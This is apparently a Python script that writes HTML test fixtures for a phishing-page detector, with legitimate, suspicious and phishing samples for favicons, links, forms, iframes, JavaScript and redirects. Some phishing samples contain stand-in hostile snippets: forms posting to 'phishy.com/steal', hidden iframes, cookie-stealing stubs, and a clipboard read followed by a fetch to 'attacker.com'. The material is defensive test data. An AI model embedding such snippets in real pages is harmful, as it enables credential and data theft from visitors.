import os



def get_project_root():
    return os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "..", "..", "..")
    )

PROJECT_ROOT = get_project_root()




FAVICON_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "favicon_test")
ANCHOR_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "anchor_test")
LINKS_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "links_test")
REQUEST_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "request_url_test")
SFH_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "sfh_test")
IFRAME_DIR=os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "iframe_test")
JS_DIR=os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "JS_test")
RIGHT_CLICK_TEST_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "right_click_test")
ONMOUSEOVER_HTML_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "onmouseover_test")
ANALYZE_TEXT_TAGS_HTML_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "analyze_textual_tags_test")
DYNAMIC_SCRIPT_HTML_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "dynamic_script_test")
AUTOREDIRECT_HTML_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "autoredirect_test")
LOGIN_FORM_HTML_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "login_form_visibility_test")
ANALYZE_TEXTUAL_TAGS_HTML_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "analyze_textual_tags_test")




favico_test_cases = {
    "test_favicon_legit.html": """
<!DOCTYPE html>
<html>
<head>
    <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon">
    <title>Legitimate Favicon Test</title>
</head>
<body>
    <h1>Legit Favicon</h1>
</body>
</html>
""",
    "test_favicon_sus.html": """
<!DOCTYPE html>
<html>
<head>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <title>Suspicious (Safe External) Favicon Test</title>
</head>
<body>
    <h1>Suspicious Favicon</h1>
</body>
</html>
""",
    "test_favicon_phish.html": """
<!DOCTYPE html>
<html>
<head>
    <link rel="icon" href="https://malicious-site.bad/favicon.png" type="image/png">
    <title>Phishing Favicon Test</title>
</head>
<body>
    <h1>Phishing Favicon</h1>
</body>
</html>
""",
    "test_favicon_phish_invalid_ext.html": """
<!DOCTYPE html>
<html>
<head>
    <link rel="icon" href="https://badactor.com/favicon.jpg" type="image/jpeg">
    <title>Phishing Favicon Test - Invalid Extension</title>
</head>
<body>
    <h1>Phishing Invalid Extension</h1>
</body>
</html>
""",
    "test_favicon_none.html": """
<!DOCTYPE html>
<html>
<head>
    <title>No Favicon Test</title>
</head>
<body>
    <h1>No favicon</h1>
</body>
</html>
""",
}
anchor_test_cases = {
    "test_anchor_legit.html": """
    <html><body>
        <a href="https://example.com/page1">Internal</a>
        <a href="https://example.com/page2">Internal</a>
        <a href="https://example.com/page3">Internal</a>
    </body></html>
    """,

    "test_anchor_suspicious.html": """
    <html><body>
        <a href="https://example.com/page1">Internal</a>
        <a href="#">Hash</a>
        <a href="javascript:void(0);">JS</a>
    </body></html>
    """,

    "test_anchor_phish.html": """
    <html><body>
        <a href="https://badsite1.com">Phish</a>
        <a href="https://badsite2.com">Phish</a>
        <a href="https://example.com/page">Legit</a>
    </body></html>
    """,

    "test_anchor_empty.html": """
    <html><body>
        <h1>No anchors here</h1>
    </body></html>
    """,

    "test_anchor_mixed.html": """
    <html><body>
        <a href="https://example.com/page1">Legit</a>
        <a href="https://evil.com">Phish</a>
        <a href="#">Hash</a>
    </body></html>
    """,
}
link_test_cases = {
    "test_links_legit.html": """
<html>
<head>
    <link href="https://example.com/style.css" rel="stylesheet">
    <script src="https://example.com/script.js"></script>
    <meta content="https://example.com/og.png">
</head>
<body><h1>Legit</h1></body>
</html>
""",
    "test_links_suspicious.html": """
<html>
<head>
    <link href="https://example.com/style.css" rel="stylesheet">
    <script src="https://cdn.somecdn.com/script.js"></script>
    <meta content="https://example.com/og.png">
</head>
<body><h1>Suspicious</h1></body>
</html>
""",
    "test_links_phish.html": """
<html>
<head>
    <link href="https://evil.com/style.css" rel="stylesheet">
    <script src="https://phish.com/script.js"></script>
    <meta content="https://tracker.com/meta.png">
</head>
<body><h1>Phish</h1></body>
</html>
""",
    "test_links_empty.html": """
<html>
<head><title>Empty</title></head>
<body><h1>No resources</h1></body>
</html>
""",
}
request_test_cases = {
    "test_request_legit.html": """
<html>
<body>
    <img src="https://example.com/img.png">
    <audio src="https://example.com/sound.mp3"></audio>
    <iframe src="https://example.com/embed.html"></iframe>
    <source src="https://example.com/video.mp4">
</body>
</html>
""",
    "test_request_mixed.html": """
<html>
<body>
    <img src="https://example.com/logo.png">
    <iframe src="https://malicious.com/track.html"></iframe>
    <video src="https://example.com/video.mp4"></video>
    <source src="https://cdn.cdncdn.com/script.js"></source>
</body>
</html>
""",
    "test_request_phish.html": """
<html>
<body>
    <img src="https://badsite.com/img.png">
    <audio src="https://trackers.com/sound.mp3"></audio>
    <iframe src="https://phishing.net/embed.html"></iframe>
    <source src="https://malicious.net/v.js"></source>
</body>
</html>
""",
    "test_request_empty.html": """
<html>
<body>
    <h1>No resources requested</h1>
</body>
</html>
""",
}
sfh_test_cases= {
    # Original batch
    "test_sfh_legit.html": """
<html><body>
    <form action="https://example.com/submit"></form>
</body></html>
""",
    "test_sfh_suspicious.html": """
<html><body>
    <form action="#"></form>
</body></html>
""",
    "test_sfh_phish.html": """
<html><body>
    <form action="http://phishy.com/post"></form>
</body></html>
""",
    "test_sfh_about_blank.html": """
<html><body>
    <form action="about:blank"></form>
</body></html>
""",
    "test_sfh_empty_action.html": """
<html><body>
    <form action=""></form>
</body></html>
""",
    "test_sfh_multiple_forms.html": """
<html><body>
    <form action="https://example.com/ok"></form>
    <form action="#"></form>
    <form action="http://bad.com/send"></form>
</body></html>
""",
    "test_sfh_all_legit_forms.html": """
<html><body>
    <form action="https://example.com/1"></form>
    <form action="https://example.com/2"></form>
    <form action="https://example.com/3"></form>
</body></html>
""",
    "test_sfh_all_phishy_forms.html": """
<html><body>
    <form action="http://evil.com/1"></form>
    <form action="http://phish.com/2"></form>
</body></html>
""",
    "test_sfh_no_forms.html": """
<html><body>
    <h1>No forms on this page</h1>
</body></html>
""",

    # Extended/Upgraded batch
    "test_sfh_login_keywords_legit.html": """
<html><body>
    <form action="https://example.com/submit">
        <input type="text" name="username">
        <input type="password" name="pass">
    </form>
</body></html>
""",
    "test_sfh_login_keywords_suspicious.html": """
<html><body>
    <form action="#">
        <input type="text" name="login">
        <input type="password" name="password">
    </form>
</body></html>
""",
    "test_sfh_login_keywords_phish.html": """
<html><body>
    <form action="http://phishy.com/steal">
        <input type="text" name="email">
        <input type="password" name="pass">
    </form>
</body></html>
""",
    "test_sfh_mixed_forms.html": """
<html><body>
    <form action="https://example.com">
        <input type="text" name="user">
    </form>
    <form action="#">
        <input type="text" name="login">
        <input type="password" name="password">
    </form>
</body></html>
""",
    "test_sfh_blank_action_only.html": """
<html><body>
    <form action="">
        <input type="text" name="user">
    </form>
</body></html>
""",
    "test_sfh_keyword_only.html": """
<html><body>
    <form action="https://example.com/submit">
        <input type="text" name="login">
    </form>
</body></html>
""",
    "test_sfh_password_only.html": """
<html><body>
    <form action="https://example.com/submit">
        <input type="password" name="pass">
    </form>
</body></html>
""",
    "test_sfh_legit_and_suspicious.html": """
<html><body>
    <form action="https://example.com">
        <input type="text" name="user">
    </form>
    <form action="">
        <input type="password" name="auth">
    </form>
</body></html>
""",
    "test_sfh_keyword_password_action.html": """
<html><body>
    <form action="#">
        <input type="password" name="password">
        <input type="text" name="login">
    </form>
</body></html>
"""
}
iframe_test_cases = {
    "test_iframe_legit.html": """
<html><body>
    <iframe src="https://example.com/embedded.html" style="border: 1px solid black;" width="500" height="300" sandbox></iframe>
</body></html>
""",
    "test_iframe_hidden.html": """
<html><body>
    <iframe src="https://example.com/embedded.html" style="display:none" width="500" height="300"></iframe>
</body></html>
""",
    "test_iframe_zero_size.html": """
<html><body>
    <iframe src="https://example.com/embedded.html" width="0" height="0"></iframe>
</body></html>
""",
    "test_iframe_external.html": """
<html><body>
    <iframe src="https://phish.com/steal.html" width="600" height="400" sandbox></iframe>
</body></html>
""",
    "test_iframe_nosandbox.html": """
<html><body>
    <iframe src="https://phish.com/form.html" width="600" height="400"></iframe>
</body></html>
""",
    "test_iframe_srcdoc_keywords.html": """
<html><body>
    <iframe srcdoc="<h1>Enter your password</h1><script>alert('fake')</script>" sandbox></iframe>
</body></html>
""",
    "test_iframe_complex_phish.html": """
<html><body>
    <iframe src="https://bad.com/iframe.html" style="visibility:hidden" width="0" height="0" srcdoc="auth user login <script>javascript:eval('phish')</script>"></iframe>
</body></html>
""",
    "test_iframe_no_iframes.html": """
<html><body>
    <h1>No iframes here</h1>
</body></html>
""",
"test_iframe_safe_srcdoc.html": """
<html><body>
    <iframe srcdoc="<p>Welcome to our site!</p>" width="500" height="300" sandbox></iframe>
</body></html>
"""
}
js_behavior_test_cases = {
    "test_js_legit.html": """
<html><body>
    <script>
        console.log("Welcome to our site!");
    </script>
</body></html>
""",
    "test_js_eval.html": """
<html><body>
    <script>
        eval("alert('Hacked!')");
    </script>
</body></html>
""",
    "test_js_new_function.html": """
<html><body>
    <script>
        var fn = new Function("alert('Danger!')");
    </script>
</body></html>
""",
    "test_js_document_write.html": """
<html><body>
    <script>
        document.write("<h1>Phishing</h1>");
    </script>
</body></html>
""",
    "test_js_onmouseover.html": """
<html><body>
    <script>
        var x = '<div onmouseover="stealCookies()">hover me</div>';
    </script>
</body></html>
""",
    "test_js_settimeout_string.html": """
<html><body>
    <script>
        setTimeout("steal()", 2000);
    </script>
</body></html>
""",
    "test_js_window_location.html": """
<html><body>
    <script>
        window.location = "http://phish.com";
    </script>
</body></html>
""",
    "test_js_innerhtml.html": """
<html><body>
    <script>
        document.getElementById("target").innerHTML = "<b>Injected</b>";
    </script>
</body></html>
""",
    "test_js_clipboard_fetch.html": """
<html><body>
    <script>
        navigator.clipboard.readText();
        fetch("http://attacker.com/data");
    </script>
</body></html>
""",
    "test_js_external_script.html": """
<html><head>
    <script src="https://evil.com/script.js"></script>
</head><body></body></html>
"""
}
right_click_html_cases = {
    "test_right_click_legit.html":"""
    <html><body>
    <h1>
    Legit page
    </h1>
    </body></html>""",
    "test_right_click_oncontextmenu.html":"""
    <html><body oncontextmenu="return false;">
    <h1>Blocked right click</h1>
    </body></html>
""",
    "test_right_click_script_block.html":"""<html><body>
<script>
document.oncontextmenu = function() { return false; }
</script>
<h1>Blocked by script</h1>
</body></html>
"""
}
onmouseover_test_cases = {
    "test_onmouseover_legit.html": """
<!DOCTYPE html>
<html>
<head><title>Legit No Mouseover</title></head>
<body>
    <h1>No onmouseover here</h1>
</body>
</html>
""",
    "test_onmouseover_in_tag.html": """
<!DOCTYPE html>
<html>
<head><title>Mouseover in Tag</title></head>
<body>
    <a href="#" onmouseover="alert('Phish!')">Hover me</a>
</body>
</html>
""",
    "test_onmouseover_in_script.html": """
<!DOCTYPE html>
<html>
<head><title>Mouseover in Script</title></head>
<body>
    <script>
        document.getElementById('target').onmouseover = function() { stealCookies(); };
    </script>
    <h1 id="target">Hover Target</h1>
</body>
</html>
"""
}
analyze_textual_tags_test_cases = {
    "test_analyze_text_legit.html": """
<!DOCTYPE html>
<html>
<head>
    <meta content="Welcome to our amazing website, have fun!">
    <script>console.log("Safe content here");</script>
</head>
<body>
    <h1>Legitimate Content</h1>
</body>
</html>
""",
    "test_analyze_text_suspicious.html": """
<!DOCTYPE html>
<html>
<head>
    <meta content="Login required to access your user account.">
    <script>console.log("Authentication needed");</script>
</head>
<body>
    <h1>Authentication Page</h1>
</body>
</html>
""",
    "test_analyze_text_phishing.html": """
<!DOCTYPE html>
<html>
<head>
    <meta content="Enter your password, credit card and security code immediately.">
    <script>
        var scam = "Bank login information required urgently.";
    </script>
</head>
<body>
    <h1>Bank Security Alert</h1>
</body>
</html>
"""
}
dynamic_script_test_cases = {
    "test_dynamic_script_legit.html": """
<!DOCTYPE html>
<html>
<head>
<script>console.log("Script 1");</script>
<script>console.log("Script 2");</script>
</head>
<body>
<h1>Legitimate Page</h1>
</body>
</html>
""",
    "test_dynamic_script_suspicious.html": """
<!DOCTYPE html>
<html>
<head>
<script>console.log("Script 1");</script>
<script>console.log("Script 2");</script>
<script>console.log("Script 3");</script>
<script>console.log("Script 4");</script>
<script>console.log("Script 5");</script>
<script>console.log("Script 6");</script>
</head>
<body>
<h1>Suspicious Page</h1>
</body>
</html>
""",
    "test_dynamic_script_phishing.html": """
<!DOCTYPE html>
<html>
<head>
""" +
"\n".join(f"<script>console.log('Script {i}');</script>" for i in range(1, 13)) +
"""
</head>
<body>
<h1>Phishing Page</h1>
</body>
</html>
"""
}
autoredirect_test_cases = {
    "test_redirect_legit.html": """
<!DOCTYPE html>
<html>
<head>
    <title>No Redirect Page</title>
</head>
<body>
    <h1>Welcome to Legit Site</h1>
</body>
</html>
""",
    "test_redirect_phish_meta.html": """
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; URL='https://example.com"/>
</head>
<body>
    <h1>Redirecting by Meta Refresh</h1>
</body>
</html>
""",
    "test_redirect_phish_window_href.html": """
<!DOCTYPE html>
<html>
<head>
    <script>
        window.onload = function() {
            window.location.href = "https://example.com"";
        }
    </script>
</head>
<body>
    <h1>Redirect via window.location.href</h1>
</body>
</html>
""",
    "test_redirect_phish_location_href.html": """
<!DOCTYPE html>
<html>
<head>
    <script>
        window.onload = function() {
            location.href = "https://example.com"";
        }
    </script>
</head>
<body>
    <h1>Redirect via location.href</h1>
</body>
</html>
""",
    "test_redirect_phish_window_replace.html": """
<!DOCTYPE html>
<html>
<head>
    <script>
        window.onload = function() {
            window.location.replace("https://example.com"");
        }
    </script>
</head>
<body>
    <h1>Redirect via window.location.replace</h1>
</body>
</html>
"""
}
login_form_visibility_test_cases = {
    "test_login_form_legit.html": """
<!DOCTYPE html>
<html>
<head>
    <title>Legit Form</title>
</head>
<body>
    <form action="/submit">
        <input type="text" name="username">
        <input type="password" name="password">
        <input type="submit">
    </form>
</body>
</html>
""",
    "test_login_form_display_none.html": """
<!DOCTYPE html>
<html>
<head>
    <title>Hidden Form Display None</title>
</head>
<body>
    <form action="/submit" style="display:none;">
        <input type="text" name="username">
        <input type="password" name="password">
        <input type="submit">
    </form>
</body>
</html>
""",
    "test_login_form_visibility_hidden.html": """
<!DOCTYPE html>
<html>
<head>
    <title>Hidden Form Visibility Hidden</title>
</head>
<body>
    <form action="/submit" style="visibility:hidden;">
        <input type="text" name="username">
        <input type="password" name="password">
        <input type="submit">
    </form>
</body>
</html>
""",
    "test_login_form_zero_size.html": """
<!DOCTYPE html>
<html>
<head>
    <title>Hidden Form Size Zero</title>
</head>
<body>
    <form action="/submit" style="width:0;height:0;">
        <input type="text" name="username">
        <input type="password" name="password">
        <input type="submit">
    </form>
</body>
</html>
"""
}
dynamic_script_injection_test_cases = {
    "test_dynamic_script_legit.html": """
<!DOCTYPE html>
<html>
<head>
<script>console.log("Script 1");</script>
<script>console.log("Script 2");</script>
</head>
<body>
<h1>Legitimate Page</h1>
</body>
</html>
""",
    "test_dynamic_script_suspicious.html": """
<!DOCTYPE html>
<html>
<head>
<script>console.log("Script 1");</script>
<script>console.log("Script 2");</script>
<script>console.log("Script 3");</script>
<script>console.log("Script 4");</script>
<script>console.log("Script 5");</script>
<script>console.log("Script 6");</script>
</head>
<body>
<h1>Suspicious Page</h1>
</body>
</html>
""",
    "test_dynamic_script_phishing.html": """
<!DOCTYPE html>
<html>
<head>
""" +
"\n".join(f"<script>console.log('Script {i}');</script>" for i in range(1, 13)) +
"""
</head>
<body>
<h1>Phishing Page</h1>
</body>
</html>
"""
}






if __name__ == "__main__":
        os.makedirs(ANALYZE_TEXTUAL_TAGS_HTML_DIR, exist_ok=True)
        for filename, content in analyze_textual_tags_test_cases.items():
            path = os.path.join(ANALYZE_TEXTUAL_TAGS_HTML_DIR, filename)
            with open(path, "w", encoding="utf-8") as f:
                f.write(content.strip())

        print(f"✅ All  test HTML files created under tests/data/")